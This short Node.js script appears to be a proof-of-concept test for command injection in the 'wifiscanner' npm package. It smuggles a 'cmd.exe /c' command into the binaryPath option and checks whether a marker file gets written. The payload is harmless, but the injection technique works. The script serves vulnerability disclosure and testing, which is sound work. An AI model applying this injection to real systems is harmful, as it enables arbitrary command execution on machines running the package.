const fs = require("fs");
const wifiscanner = require("wifiscanner");
const path = "./wifiscanner.txt";

try {
  if (fs.existsSync(path)) fs.unlinkSync(path);
} catch (err) {}

let exists = fs.existsSync(path);
console.log(`{ ${exists}, false }`);

let options = {
  binaryPath: `cmd.exe /c "echo injected > wifiscanner.txt"`,
  args: ""
};


try {
  let scanner = wifiscanner(options);
  scanner.scan(() => {});
} catch (err) {}

// wait a bit for exec to complete
setTimeout(() => {
  exists = fs.existsSync(path);
  console.log(`{ ${exists}, true }`);
  if (exists) fs.unlinkSync(path);
}, 1500);
